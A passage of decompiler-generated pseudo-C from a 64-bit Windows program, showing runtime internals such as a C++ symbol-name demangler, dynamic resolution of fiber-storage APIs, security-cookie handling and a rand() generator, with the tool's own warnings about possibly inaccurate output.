    if ( v4[1] > 77 )
    {
      if ( *v5 <= 79 )
        goto LABEL_24;
      if ( *v5 != 81 )
      {
        if ( *v5 != 104 )
          return 0xFFFF;
        dword_13F1C5FA8 = 0;
      }
    }
    else if ( *v5 < 76 )
    {
      if ( !*v5 )
        return 65534;
      if ( ((*v5 - 70) & 0xFD) != 0 )
      {
        if ( *v5 != 74 )
          return 0xFFFF;
LABEL_24:
        v2 = v4 + 2;
        off_13F1C5F88 = v4 + 2;
        if ( (unsigned __int8)(v4[2] - 48) <= 9u )
        {
          off_13F1C5F88 = &v2[*v2 - 47];
          return sub_13F166CB4() | 0x10000;
        }
        v7 = 0xFFFF;
        goto LABEL_51;
      }
    }
    v0 = v4 + 2;
    off_13F1C5F88 = v4 + 2;
  }
  v15 = *v0;
  if ( (unsigned __int8)(*v0 - 48) > 8u )
  {
    if ( v15 == 57 )
    {
      v7 = 65533;
      off_13F1C5F88 = v0 + 1;
    }
    else
    {
      return (v15 != 0) + 65534;
    }
  }
  else
  {
    off_13F1C5F88 = v0 + 1;
    v16 = v15 - 48;
    if ( v16 )
    {
      v17 = v16 - 1;
      if ( v17 )
      {
        v18 = v17 - 1;
        if ( v18 )
        {
          v19 = v18 - 1;
          if ( v19 )
          {
            v20 = v19 - 1;
            if ( v20 )
            {
              v21 = v20 - 1;
              if ( v21 )
              {
                v22 = v21 - 1;
                if ( v22 )
                {
                  v23 = v22 - 1;
                  if ( v23 )
                  {
                    if ( v23 != 1 )
                      return 0xFFFF;
                    return 30720;
                  }
                  else
                  {
                    return 28672;
                  }
                }
                else
                {
                  return 26624;
                }
              }
              else
              {
                return 24576;
              }
            }
            else
            {
              return 0x2000;
            }
          }
          else
          {
            return 0x4000;
          }
        }
        else
        {
          return 0;
        }
      }
      else
      {
        return 4096;
      }
    }
    else
    {
      return 2048;
    }
  }
  return v7;
}
// 13F166CD9: write access to const memory at 13F1C5F88 has been detected
// 13F166CFA: write access to const memory at 13F1C5F88 has been detected
// 13F166D34: write access to const memory at 13F1C5F88 has been detected
// 13F166D59: write access to const memory at 13F1C5F88 has been detected
// 13F166D77: write access to const memory at 13F1C5FA8 has been detected
// 13F166D9D: write access to const memory at 13F1C5F88 has been detected
// 13F166DB9: write access to const memory at 13F1C5F88 has been detected
// 13F166E30: write access to const memory at 13F1C5F88 has been detected
// 13F166EB2: write access to const memory at 13F1C5F88 has been detected
// 13F166ED2: write access to const memory at 13F1C5F88 has been detected
// 13F166F6C: write access to const memory at 13F1C5F88 has been detected
// 13F166F9B: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5FA8: using guessed type int dword_13F1C5FA8;

//----- (000000013F167014) ----------------------------------------------------
char *__fastcall sub_13F167014(__int64 a1, char *a2, int a3)
{
  __int64 (__fastcall ***v6)(_QWORD); // rcx
  int v7; // eax
  char v8; // cl
  char *v9; // rax
  char *i; // rdx
  __int64 (__fastcall ***v11)(_QWORD); // [rsp+20h] [rbp-28h] BYREF
  int v12; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall ***v13)(_QWORD); // [rsp+30h] [rbp-18h] BYREF
  int v14; // [rsp+38h] [rbp-10h]

  v11 = 0i64;
  v12 = 0;
  sub_13F167680((__int64)&v13);
  if ( (_BYTE)v14 == 3 )
    return 0i64;
  if ( (_BYTE)v14 == 2 || aAvrsafunctionC[25] )
  {
    sub_13F161644((__int64)&v11, "?AVRSAFunction@CryptoPP@@");
    v6 = v11;
  }
  else
  {
    v6 = v13;
    v11 = v13;
    v12 = v14;
  }
  if ( a2
    || (v6 ? (v7 = (**v6)(v6)) : (v7 = 0),
        a3 = v7 + 1,
        (a2 = (char *)sub_13F15E524((v7 + 1 + 7i64) & 0xFFFFFFFFFFFFFFF8ui64)) != 0i64) )
  {
    sub_13F166118(&v11, a2, a3);
    v8 = *a2;
    v9 = a2;
    for ( i = a2; *v9; ++i )
    {
      ++v9;
      if ( v8 == 32 )
      {
        *i = 32;
        while ( *v9 == 32 )
          ++v9;
      }
      else
      {
        *i = v8;
      }
      v8 = *v9;
    }
    *i = v8;
  }
  return a2;
}
// 13F15E524: using guessed type __int64 __fastcall sub_13F15E524(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F90: using guessed type char *off_13F1C5F90;
// 13F1C5F98: using guessed type int dword_13F1C5F98;
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F167120) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F167120(__int64 a1, __int64 a2)
{
  int v3; // eax
  __int64 v4; // rax
  __int64 v5; // rax
  char *v6; // rax
  char v7; // dl
  char v8; // cl
  __int64 v9; // rax
  __int64 v10; // rbx
  __int64 v11; // rax
  __int64 v13; // [rsp+30h] [rbp-50h] BYREF
  int v14; // [rsp+38h] [rbp-48h]
  __int64 *v15; // [rsp+40h] [rbp-40h] BYREF
  int v16; // [rsp+48h] [rbp-38h]
  char v17[16]; // [rsp+50h] [rbp-30h] BYREF
  char v18[16]; // [rsp+60h] [rbp-20h] BYREF
  char v19[16]; // [rsp+70h] [rbp-10h] BYREF
  char v20; // [rsp+90h] [rbp+10h] BYREF

  *(_QWORD *)a1 = *(_QWORD *)a2;
  v3 = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 8) = v3;
  if ( (char)v3 <= 1 )
  {
    v16 = 0;
    if ( aAvrsafunctionC[25] )
    {
      v13 = 0i64;
      v14 = 0;
      v15 = 0i64;
      sub_13F163334((__int64)v17, (__int64)&v15, byte_13F19C050, &v13, 0);
      v4 = sub_13F1616E8((__int64)v17, (__int64)v18, 32);
      v5 = sub_13F1616BC(v4, (__int64)v19, a1);
      *(_QWORD *)a1 = *(_QWORD *)v5;
      LODWORD(v5) = *(_DWORD *)(v5 + 8);
      *(_DWORD *)(a1 + 8) = v5;
      if ( (char)v5 <= 1 )
      {
        v6 = "";
        if ( aAvrsafunctionC[25] == 64 )
          goto LABEL_20;
        sub_13F161830(a1, "{for ");
        v6 = "";
        if ( *(char *)(a1 + 8) <= 1 )
        {
          v7 = *(_BYTE *)(a1 + 8);
          do
          {
            v8 = v7;
            if ( !*v6 || *v6 == 64 )
              break;
            v9 = sub_13F165B08((__int64)v19);
            v13 = 0i64;
            v14 = 0;
            v20 = 96;
            v10 = v9;
            sub_13F1627A8((__int64)&v13, &v20, 1u);
            sub_13F1616BC((__int64)&v13, (__int64)v17, v10);
            v11 = sub_13F1616E8((__int64)v17, (__int64)v18, 39);
            sub_13F16176C(a1, v11);
            v6 = "";
            if ( aAvrsafunctionC[25] == 64 )
            {
              v6 = &aAvrsafunctionC[26];
              off_13F1C5F88 = &aAvrsafunctionC[26];
            }
            v8 = *(_BYTE *)(a1 + 8);
            if ( v8 <= 1 && *v6 != 64 )
            {
              sub_13F161830(a1, "s ");
              v8 = *(_BYTE *)(a1 + 8);
              v6 = "";
            }
            v7 = v8;
          }
          while ( v8 <= 1 );
          if ( v8 <= 1 )
          {
            if ( !*v6 )
              sub_13F1618BC(a1, 1u);
            sub_13F1617B0(a1, 125);
            v6 = "";
          }
        }
        if ( *v6 == 64 )
LABEL_20:
          off_13F1C5F88 = v6 + 1;
      }
    }
    else
    {
      v15 = qword_13F18D620;
      sub_13F1616BC((__int64)&v15, (__int64)&v13, a1);
      *(_QWORD *)a1 = v13;
      *(_DWORD *)(a1 + 8) = v14;
    }
  }
  return a1;
}
// 13F16726C: write access to const memory at 13F1C5F88 has been detected
// 13F1672D4: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F167320) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F167320(__int64 a1, char a2, char a3)
{
  unsigned int v6; // er8
  __int64 v7; // rax
  __int64 v8; // rcx
  __int64 *v9; // rax
  char *v10; // rdi
  char *v11; // rcx
  const char *v12; // rax
  int v13; // er8
  char *v14; // r9
  char *v15; // rcx
  const char *v16; // rax
  int v17; // er8
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rcx
  __int64 v23; // [rsp+20h] [rbp-29h] BYREF
  int v24; // [rsp+28h] [rbp-21h]
  char v25[16]; // [rsp+38h] [rbp-11h] BYREF
  __int64 v26[2]; // [rsp+48h] [rbp-1h] BYREF
  char v27[16]; // [rsp+58h] [rbp+Fh] BYREF
  char v28[16]; // [rsp+68h] [rbp+1Fh] BYREF

  v6 = aAvrsafunctionC[25] - 48;
  if ( v6 <= 9 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[26];
    sub_13F16167C((signed int *)0x20EAD8, a1, v6);
    return a1;
  }
  v23 = 0i64;
  v24 = 0;
  if ( aAvrsafunctionC[25] == 63 )
  {
    v7 = sub_13F166A94((__int64)v25, 0);
    v8 = *(_QWORD *)v7;
    v24 = *(_DWORD *)(v7 + 8);
    v23 = v8;
    off_13F1C5F88 = &aAvrsafunctionC[26];
    if ( aAvrsafunctionC[25] != 64 )
    {
      off_13F1C5F88 = "";
      v9 = qword_13F18D620;
      v24 = (aAvrsafunctionC[25] != 0) + 1;
      if ( aAvrsafunctionC[25] )
        v9 = 0i64;
      v23 = (__int64)v9;
    }
    goto LABEL_25;
  }
  v10 = "template-parameter-";
  v11 = "";
  v12 = "template-parameter-";
  v13 = 18;
  do
  {
    if ( !*v11 )
      break;
    if ( *v11 != *v12 )
      break;
    ++v11;
    ++v12;
    --v13;
  }
  while ( v13 );
  if ( *v11 == *v12 )
  {
    v14 = &aAvrsafunctionC[44];
LABEL_20:
    off_13F1C5F88 = v14;
    sub_13F166084((__int64)v26);
    sub_13F161644((__int64)&v23, "`");
    v18 = sub_13F161444((__int64)v27, v10);
    sub_13F1616BC(v18, (__int64)v25, (__int64)v26);
    v19 = sub_13F161714((__int64)v25, (__int64)v28, (char *)&qword_13F19B5B0);
    sub_13F16176C((__int64)&v23, v19);
    goto LABEL_25;
  }
  v10 = "generic-type-";
  v15 = "";
  v16 = "generic-type-";
  v17 = 12;
  do
  {
    if ( !*v15 )
      break;
    if ( *v15 != *v16 )
      break;
    ++v15;
    ++v16;
    --v17;
  }
  while ( v17 );
  if ( *v15 == *v16 )
  {
    v14 = &aAvrsafunctionC[38];
    goto LABEL_20;
  }
  if ( a3 && aAvrsafunctionC[25] == 64 )
  {
    v23 = 0i64;
    off_13F1C5F88 = &aAvrsafunctionC[26];
    v24 = 0;
  }
  else
  {
    v20 = sub_13F1612F4((__int64)v27, (char **)&off_13F1C5F88, 64);
    v21 = *(_QWORD *)v20;
    LODWORD(v20) = *(_DWORD *)(v20 + 8);
    v23 = v21;
    v24 = v20;
  }
LABEL_25:
  if ( a2 && MEMORY[0x20EAD8] != 9 )
    sub_13F161928((int *)0x20EAD8, (__int64)&v23);
  *(_QWORD *)a1 = v23;
  *(_DWORD *)(a1 + 8) = v24;
  return a1;
}
// 13F167373: write access to const memory at 13F1C5F88 has been detected
// 13F1673B9: write access to const memory at 13F1C5F88 has been detected
// 13F1673CC: write access to const memory at 13F1C5F88 has been detected
// 13F167472: write access to const memory at 13F1C5F88 has been detected
// 13F16757E: write access to const memory at 13F1C5F88 has been detected
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F167320: using guessed type char var_38[16];

//----- (000000013F1675FC) ----------------------------------------------------
__int64 __fastcall sub_13F1675FC(__int64 a1)
{
  return *(unsigned int *)(a1 + 12);
}

//----- (000000013F167600) ----------------------------------------------------
__int64 __fastcall sub_13F167600(__int64 a1)
{
  __int64 (__fastcall ****v1)(_QWORD); // rcx
  __int64 result; // rax
  __int64 (__fastcall ***v3)(_QWORD); // rcx

  v1 = *(__int64 (__fastcall *****)(_QWORD))(a1 + 8);
  result = 0i64;
  if ( v1 )
  {
    v3 = *v1;
    if ( v3 )
      return (**v3)(v3);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F167628) ----------------------------------------------------
__int64 __fastcall sub_13F167628(__int64 a1)
{
  __int64 result; // rax
  unsigned int (__fastcall ***v3)(_QWORD); // rdi
  int v4; // ebx

  result = *(unsigned int *)(a1 + 24);
  if ( (int)result < 0 )
  {
    v3 = *(unsigned int (__fastcall ****)(_QWORD))(a1 + 16);
    v4 = (***(__int64 (__fastcall ****)(_QWORD))(a1 + 8))(*(_QWORD *)(a1 + 8));
    result = v4 + (**v3)(v3);
    *(_DWORD *)(a1 + 24) = result;
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F16767C) ----------------------------------------------------
__int64 __fastcall sub_13F16767C(__int64 a1)
{
  return *(unsigned int *)(a1 + 16);
}

//----- (000000013F167680) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F167680(__int64 a1)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  int v4; // eax
  __int64 v5; // rax
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rcx
  __int64 v10; // [rsp+20h] [rbp-38h] BYREF
  int v11; // [rsp+28h] [rbp-30h]
  char v12[16]; // [rsp+30h] [rbp-28h] BYREF
  char v13[24]; // [rsp+40h] [rbp-18h] BYREF

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  if ( "?AVRSAFunction@CryptoPP@@" )
  {
    if ( aAvrsafunctionC[0] != 63 )
    {
LABEL_9:
      v7 = sub_13F163BD4((__int64)v13);
      v8 = *(_QWORD *)v7;
      v4 = *(_DWORD *)(v7 + 8);
      *(_QWORD *)a1 = v8;
      goto LABEL_10;
    }
    if ( aAvrsafunctionC[1] == 64 )
    {
      off_13F1C5F88 = &aAvrsafunctionC[27];
      v2 = sub_13F163BD4((__int64)v12);
      v3 = sub_13F161444((__int64)v13, "CV: ");
      sub_13F1616BC(v3, (__int64)&v10, v2);
      *(_QWORD *)a1 = v10;
      v4 = v11;
LABEL_10:
      *(_DWORD *)(a1 + 8) = v4;
      return a1;
    }
    if ( aAvrsafunctionC[1] != 36 )
    {
      if ( aAvrsafunctionC[1] == 63 && aAvrsafunctionC[2] == 64 )
      {
        *(_BYTE *)(a1 + 8) = 2;
        return a1;
      }
      goto LABEL_9;
    }
    v5 = sub_13F166A94((__int64)v13, 0);
    v6 = *(_QWORD *)v5;
    LODWORD(v5) = *(_DWORD *)(v5 + 8);
    *(_QWORD *)a1 = v6;
    *(_DWORD *)(a1 + 8) = v5;
    if ( (_BYTE)v5 == 2 || aAvrsafunctionC[25] )
    {
      off_13F1C5F88 = "?AVRSAFunction@CryptoPP@@";
      goto LABEL_9;
    }
  }
  return a1;
}
// 13F1676B4: write access to const memory at 13F1C5F88 has been detected
// 13F167738: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F90: using guessed type char *off_13F1C5F90;
// 13F1C5F98: using guessed type int dword_13F1C5F98;
// 13F167680: using guessed type char var_28[16];

//----- (000000013F167778) ----------------------------------------------------
char *__fastcall sub_13F167778(
        char *a1,
        char *a2,
        int a3,
        __int64 (__fastcall *a4)(),
        __int64 (__fastcall *a5)(_QWORD),
        unsigned __int16 a6)
{
  return sub_13F1677A0(a1, a2, a3, a4, a5, 0i64, a6);
}

//----- (000000013F1677A0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char *__fastcall sub_13F1677A0(
        char *a1,
        char *a2,
        int a3,
        __int64 (__fastcall *a4)(),
        __int64 (__fastcall *a5)(_QWORD),
        __int64 a6,
        int a7)
{
  char *v12; // rbx
  int v13[22]; // [rsp+20h] [rbp-B8h] BYREF
  int v14; // [rsp+78h] [rbp-60h] BYREF

  if ( !a4 )
    return 0i64;
  sub_13F16792C();
  off_13F1C5FB0 = (__int64 (__fastcall *)(_QWORD))a4;
  off_13F1C5FB8 = a5;
  qword_13F1C5FD0 = 0i64;
  xmmword_13F1C5FC0 = 0i64;
  v13[0] = -1;
  v14 = -1;
  off_13F1C5F90 = a2;
  off_13F1C5F88 = a2;
  qword_13F1C5F78 = (__int64)&v14;
  qword_13F1C5F70 = (__int64)v13;
  dword_13F1C5F98 = a7;
  qword_13F1C5FA0 = a6;
  byte_13F1C5F9C = 0;
  dword_13F1C5FA8 = 0;
  dword_13F1C5FAC = 0;
  v12 = sub_13F167014((__int64)v13, a1, a3);
  if ( sub_13F12E550 )
    *((_QWORD *)&xmmword_13F1C5FC0 + 1) = 0i64;
  sub_13F167980();
  return v12;
}
// 13F1677ED: write access to const memory at 13F1C5FB0 has been detected
// 13F1677FC: write access to const memory at 13F1C5FB8 has been detected
// 13F167803: write access to const memory at 13F1C5FD0 has been detected
// 13F16780E: write access to const memory at 13F1C5FC0 has been detected
// 13F167821: write access to const memory at 13F1C5F90 has been detected
// 13F167828: write access to const memory at 13F1C5F88 has been detected
// 13F167834: write access to const memory at 13F1C5F78 has been detected
// 13F167840: write access to const memory at 13F1C5F70 has been detected
// 13F16784E: write access to const memory at 13F1C5F98 has been detected
// 13F16785C: write access to const memory at 13F1C5FA0 has been detected
// 13F167863: write access to const memory at 13F1C5F9C has been detected
// 13F16786A: write access to const memory at 13F1C5FA8 has been detected
// 13F167871: write access to const memory at 13F1C5FAC has been detected
// 13F16789E: write access to const memory at 13F1C5FC8 has been detected
// 13F1678AD: write access to const memory at 13F1C5FC0 has been detected
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5F70: using guessed type __int64 qword_13F1C5F70;
// 13F1C5F78: using guessed type __int64 qword_13F1C5F78;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F90: using guessed type char *off_13F1C5F90;
// 13F1C5F98: using guessed type int dword_13F1C5F98;
// 13F1C5F9C: using guessed type char byte_13F1C5F9C;
// 13F1C5FA0: using guessed type __int64 qword_13F1C5FA0;
// 13F1C5FA8: using guessed type int dword_13F1C5FA8;
// 13F1C5FAC: using guessed type int dword_13F1C5FAC;
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);
// 13F1C5FB8: using guessed type __int64 (__fastcall *off_13F1C5FB8)(_QWORD);
// 13F1C5FC0: using guessed type __int128 xmmword_13F1C5FC0;
// 13F1C5FD0: using guessed type __int64 qword_13F1C5FD0;

//----- (000000013F1678D4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
uintptr_t sub_13F1678D4()
{
  uintptr_t result; // rax

  result = _security_cookie;
  qword_13F1C5FD8 = _security_cookie;
  return result;
}
// 13F1678DB: write access to const memory at 13F1C5FD8 has been detected
// 13F1C5FD8: using guessed type __int64 qword_13F1C5FD8;

//----- (000000013F1678E4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F1678E4()
{
  __int64 v0; // rbx

  v0 = 0i64;
  while ( (unsigned int)sub_13F167CA0((__int64)&qword_13F1C5FE0[5 * v0], 0xFA0u, 0) )
  {
    dword_13F1C6008 = 2;
    v0 = (unsigned int)(v0 + 1);
    if ( (_DWORD)v0 )
      return 1;
  }
  sub_13F167948();
  return 0;
}
// 13F16790C: write access to const memory at 13F1C6008 has been detected
// 13F1C5FE0: using guessed type __int64 qword_13F1C5FE0[4];
// 13F1C6008: using guessed type int dword_13F1C6008;

//----- (000000013F16792C) ----------------------------------------------------
void sub_13F16792C()
{
  JUMPOUT(0x771DD7F0i64);
}
// 13F16793E: control flows out of bounds to 771DD7F0

//----- (000000013F167948) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F167948()
{
  int v0; // ebx

  v0 = 1;
  while ( v0 )
  {
    MEMORY[0x771B38F0](&qword_13F1C5FE0[5 * (unsigned int)--v0]);
    dword_13F1C6008 = 0;
  }
  return 1;
}
// 13F16796D: write access to const memory at 13F1C6008 has been detected
// 13F1C5FE0: using guessed type __int64 qword_13F1C5FE0[4];
// 13F1C6008: using guessed type int dword_13F1C6008;

//----- (000000013F167980) ----------------------------------------------------
void sub_13F167980()
{
  JUMPOUT(0x771DD830i64);
}
// 13F167992: control flows out of bounds to 771DD830

//----- (000000013F16799C) ----------------------------------------------------
__int64 __fastcall sub_13F16799C(unsigned int a1, __int64 a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r15
  unsigned int *v6; // rbp
  uintptr_t v8; // r10
  __int64 v9; // rdx
  __int64 result; // rax
  __int64 v11; // rsi
  __int64 v12; // rbx
  wchar_t *v13; // r14

  v4 = a1;
  v6 = a3;
  v8 = _security_cookie;
  v9 = __ROR8__(qword_13F1C6028[a1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( v9 == -1 )
    return 0i64;
  if ( v9 )
    return v9;
  if ( a3 == a4 )
  {
LABEL_21:
    v12 = 0i64;
    goto LABEL_22;
  }
  while ( 1 )
  {
    v11 = *v6;
    v12 = qword_13F1C6010[v11];
    if ( !v12 )
      break;
    if ( v12 != -1 )
      goto LABEL_25;
LABEL_19:
    if ( ++v6 == a4 )
    {
      v8 = _security_cookie;
      goto LABEL_21;
    }
  }
  v13 = off_13F18D650[v11];
  v12 = MEMORY[0x76F85AE0](v13, 0i64, 2048i64);
  if ( !v12 )
  {
    if ( (unsigned int)MEMORY[0x76F91760]() == 87
      && (unsigned int)sub_13F16E184(v13, L"api-ms-", 7i64)
      && (unsigned int)sub_13F16E184(v13, L"ext-ms-", 7i64) )
    {
      v12 = MEMORY[0x76F85AE0](v13, 0i64, 0i64);
    }
    else
    {
      v12 = 0i64;
    }
  }
  if ( !v12 )
  {
    _InterlockedExchange64(&qword_13F1C6010[v11], -1i64);
    goto LABEL_19;
  }
  if ( _InterlockedExchange64(&qword_13F1C6010[v11], v12) )
    MEMORY[0x76F85AC0](v12);
LABEL_25:
  v8 = _security_cookie;
LABEL_22:
  if ( v12 )
  {
    result = MEMORY[0x76F92020](v12, a2);
    if ( result )
    {
      _InterlockedExchange64(
        &qword_13F1C6028[v4],
        _security_cookie ^ __ROR8__(result, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
      return result;
    }
    v8 = _security_cookie;
  }
  _InterlockedExchange64(&qword_13F1C6028[v4], v8 ^ __ROR8__(-1i64, 64 - ((unsigned __int8)v8 & 0x3Fu)));
  return 0i64;
}
// 13F167AD1: conditional instruction was optimized away because rbx.8!=0
// 13F18D650: using guessed type wchar_t *off_13F18D650[2];
// 13F18D700: using guessed type wchar_t aApiMs[8];
// 13F18D710: using guessed type wchar_t aExtMs[8];
// 13F1C6010: using guessed type __int64 qword_13F1C6010[];
// 13F1C6028: using guessed type __int64 qword_13F1C6028[];

//----- (000000013F167B74) ----------------------------------------------------
__int64 __fastcall sub_13F167B74(__int64 a1)
{
  __int64 (__fastcall *v2)(__int64); // rax

  v2 = (__int64 (__fastcall *)(__int64))sub_13F16799C(
                                          0,
                                          (__int64)"FlsAlloc",
                                          (unsigned int *)&qword_13F18D720,
                                          (unsigned int *)&qword_13F18D728);
  if ( !v2 )
    JUMPOUT(0x76F865A0i64);
  return v2(a1);
}
// 13F167BB2: control flows out of bounds to 76F865A0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D720: using guessed type __int64 qword_13F18D720;
// 13F18D728: using guessed type __int64 qword_13F18D728;

//----- (000000013F167BBC) ----------------------------------------------------
__int64 __fastcall sub_13F167BBC(unsigned int a1)
{
  __int64 (__fastcall *v2)(_QWORD); // rax

  v2 = (__int64 (__fastcall *)(_QWORD))sub_13F16799C(
                                         1u,
                                         (__int64)"FlsFree",
                                         (unsigned int *)&qword_13F18D728,
                                         (unsigned int *)&qword_13F18D730);
  if ( !v2 )
    JUMPOUT(0x76F80A30i64);
  return v2(a1);
}
// 13F167BFB: control flows out of bounds to 76F80A30
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D728: using guessed type __int64 qword_13F18D728;
// 13F18D730: using guessed type __int64 qword_13F18D730;

//----- (000000013F167C04) ----------------------------------------------------
__int64 __fastcall sub_13F167C04(unsigned int a1)
{
  __int64 (__fastcall *v2)(_QWORD); // rax

  v2 = (__int64 (__fastcall *)(_QWORD))sub_13F16799C(
                                         2u,
                                         (__int64)"FlsGetValue",
                                         (unsigned int *)&qword_13F18D730,
                                         (unsigned int *)&qword_13F18D738);
  if ( !v2 )
    JUMPOUT(0x76F91580i64);
  return v2(a1);
}
// 13F167C43: control flows out of bounds to 76F91580
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D730: using guessed type __int64 qword_13F18D730;
// 13F18D738: using guessed type __int64 qword_13F18D738;

//----- (000000013F167C4C) ----------------------------------------------------
__int64 __fastcall sub_13F167C4C(unsigned int a1, __int64 a2)
{
  __int64 (__fastcall *v4)(_QWORD, __int64); // rax

  v4 = (__int64 (__fastcall *)(_QWORD, __int64))sub_13F16799C(
                                                  3u,
                                                  (__int64)"FlsSetValue",
                                                  (unsigned int *)&qword_13F18D738,
                                                  (unsigned int *)&qword_13F18D740);
  if ( v4 )
    return v4(a1, a2);
  else
    return MEMORY[0x76F85170](a1, a2);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D738: using guessed type __int64 qword_13F18D738;
// 13F18D740: using guessed type __int64 qword_13F18D740;

//----- (000000013F167CA0) ----------------------------------------------------
__int64 __fastcall sub_13F167CA0(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 (__fastcall *v6)(__int64, _QWORD, _QWORD); // rax

  v6 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))sub_13F16799C(
                                                          4u,
                                                          (__int64)"InitializeCriticalSectionEx",
                                                          (unsigned int *)&qword_13F18D740,
                                                          (unsigned int *)&qword_13F18D748);
  if ( v6 )
    return v6(a1, a2, a3);
  else
    return MEMORY[0x76F85980](a1, a2);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D740: using guessed type __int64 qword_13F18D740;
// 13F18D748: using guessed type __int64 qword_13F18D748;

//----- (000000013F167D04) ----------------------------------------------------
uintptr_t sub_13F167D04()
{
  uintptr_t result; // rax

  result = _security_cookie;
  memset64(qword_13F1C6028, _security_cookie, &dword_13F1C6050 >= (int *)qword_13F1C6028 ? 5 : 0);
  return result;
}
// 13F1C6028: using guessed type __int64 qword_13F1C6028[];
// 13F1C6050: using guessed type int dword_13F1C6050;

//----- (000000013F167D34) ----------------------------------------------------
__int64 *__fastcall sub_13F167D34(char a1)
{
  __int64 *v1; // rbx
  __int64 *result; // rax

  if ( !a1 )
  {
    v1 = qword_13F1C6010;
    do
    {
      if ( *v1 )
      {
        if ( *v1 != -1 )
          MEMORY[0x76F85AC0]();
        *v1 = 0i64;
      }
      ++v1;
      result = qword_13F1C6028;
    }
    while ( v1 != qword_13F1C6028 );
  }
  return result;
}
// 13F1C6010: using guessed type __int64 qword_13F1C6010[];
// 13F1C6028: using guessed type __int64 qword_13F1C6028[];

//----- (000000013F167D90) ----------------------------------------------------
void sub_13F167D90()
{
  ;
}

//----- (000000013F167DC4) ----------------------------------------------------
struct _TEB *__fastcall sub_13F167DC4(__int64 a1)
{
  struct _TEB *result; // rax
  PVOID v2; // rcx

  result = (struct _TEB *)_guard_check_icall_fptr;
  if ( (char *)_guard_check_icall_fptr != (char *)guard_check_icall_nop )
  {
    result = NtCurrentTeb();
    v2 = *(PVOID *)(a1 + 152);
    if ( v2 < result->NtTib.StackLimit || v2 > result->NtTib.StackBase )
      __fastfail(0xDu);
  }
  return result;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F167E10) ----------------------------------------------------
void sub_13F167E10()
{
  void (*v0)(void); // rax

  sub_13F167D90();
  v0();
  nullsub_1();
  sub_13F167D90();
}
// 13F167E2E: variable 'v0' is possibly undefined
// 13F167DC0: using guessed type __int64 nullsub_1(void);

//----- (000000013F167E60) ----------------------------------------------------
void __fastcall sub_13F167E60(__int64 a1, __int64 a2, __int64 a3)
{
  void (__fastcall *v3)(__int64); // rax

  sub_13F167D90();
  v3(a3);
  nullsub_1();
  sub_13F167D90();
}
// 13F167E88: variable 'v3' is possibly undefined
// 13F167DC0: using guessed type __int64 nullsub_1(void);

//----- (000000013F167EA8) ----------------------------------------------------
__int64 sub_13F167EA8()
{
  __int64 v0; // rax
  unsigned int v1; // ecx

  v0 = sub_13F16E528();
  v1 = 214013 * *(_DWORD *)(v0 + 40) + 2531011;
  *(_DWORD *)(v0 + 40) = v1;
  return HIWORD(v1) & 0x7FFF;
}

//----- (000000013F167ED4) ----------------------------------------------------
__int64 __fastcall sub_13F167ED4(int a1)
{
  __int64 result; // rax

  result = sub_13F16E528();
  *(_DWORD *)(result + 40) = a1;
  return result;
}

//----- (000000013F167EEC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F167EEC()
{
  __int64 v0; // rbx
  __int64 v1; // rdi
  __int64 v2; // r14
  __int64 *v3; // rsi
  __int64 *v4; // rbp
